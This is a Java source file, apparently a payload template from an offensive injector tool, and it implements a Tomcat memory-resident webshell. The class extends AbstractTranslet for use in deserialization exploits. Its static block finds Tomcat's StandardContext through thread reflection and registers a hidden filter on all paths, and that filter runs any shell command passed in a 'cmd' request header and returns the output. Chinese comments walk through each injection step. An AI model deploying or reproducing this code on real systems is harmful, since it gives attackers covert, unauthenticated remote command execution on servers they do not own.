package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.lang.reflect.Field;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationContext;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.Context;


import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class TomcatFilter extends AbstractTranslet {

    static {
        try {
            String name = "roboterh";
            String cmdHeader = "cmd";
            String filterRoute = "/*";

            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Object target = getField(thread,"target");
                        Object global = null;
                        if (target instanceof Runnable){
                            // 需要遍历其中的 this$0/handler/global
                            // 需要进行异常捕获，因为存在找不到的情况
                            try {
                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
                            } catch (NoSuchFieldException fieldException){
                                fieldException.printStackTrace();
                            }
                        }
                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
                        if (global != null){
                            List processors = (List) getField(global,"processors");
                            for (i=0;i<processors.size();i++){
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null){
                                    Request tempRequest = (Request) getField(requestInfo,"req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();

                                    //从request中获取ServletContext
                                    ServletContext servletContext = request.getServletContext();
                                    //从context中获取ApplicationContext对象
                                    Field appctx = servletContext.getClass().getDeclaredField("context");
                                    appctx.setAccessible(true);
                                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

                                    //从ApplicationContext中获取StandardContext对象
                                    Field stdctx = applicationContext.getClass().getDeclaredField("context");
                                    stdctx.setAccessible(true);
                                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

                                    //从StandardContext中获得filterConfigs这个map对象
                                    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                                    Configs.setAccessible(true);
                                    Map filterConfigs = (Map) Configs.get(standardContext);

                                    //如果这个过滤器名字没有注册过
                                    if (filterConfigs.get(name) == null) {
                                        //自定义一个Filter对象
                                        Filter filter = new Filter() {
                                            @Override
                                            public void init(FilterConfig filterConfig) throws ServletException {

                                            }

                                            @Override
                                            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                                                HttpServletRequest req = (HttpServletRequest) servletRequest;
                                                HttpServletResponse resp = (HttpServletResponse) servletResponse;
                                                if (req.getHeader(cmdHeader) != null) {
                                                    PrintWriter writer = resp.getWriter();
                                                    String cmd = req.getHeader(cmdHeader);
                                                    String[] commands = new String[3];
                                                    String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
                                                    if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                                                        commands[0] = "cmd";
                                                        commands[1] = "/c";
                                                    } else {
                                                        commands[0] = "/bin/sh";
                                                        commands[1] = "-c";
                                                    }
                                                    commands[2] = cmd;
                                                    try {
                                                        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
                                                        writer.getClass().getDeclaredMethod("flush").invoke(writer);
                                                        writer.getClass().getDeclaredMethod("close").invoke(writer);
                                                        return;
                                                    } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
                                                        e.printStackTrace();
                                                    }

                                                }
                                                filterChain.doFilter(servletRequest, servletResponse);
                                            }

                                            @Override
                                            public void destroy() {

                                            }

                                        };

                                        //创建FilterDef对象 并添加 filter对象，filtername, filter类
                                        FilterDef filterDef = new FilterDef();
                                        filterDef.setFilter(filter);
                                        filterDef.setFilterName(name);
                                        filterDef.setFilterClass(filter.getClass().getName());
                                        //通过addFilterDef方法添加 filterDef 方法
                                        standardContext.addFilterDef(filterDef);

                                        //创建FilterMap对象，并添加 filter映射，filtername
                                        FilterMap filterMap = new FilterMap();
                                        filterMap.addURLPattern(filterRoute);
                                        filterMap.setFilterName(name);
                                        //这个不要忘记了
                                        filterMap.setDispatcher(DispatcherType.REQUEST.name());

                                        //通过addFilterMapBefore方法添加filterMap对象
                                        standardContext.addFilterMapBefore(filterMap);

                                        //通过前面获取的filtermaps的put方法放入filterConfig
                                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                                        constructor.setAccessible(true);
                                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                                        filterConfigs.put(name, filterConfig);
                                    }
                                }
                            }
                        }
                    }
                }
                if (flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    public static Object getField(Object obj,String fieldName) throws Exception{
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
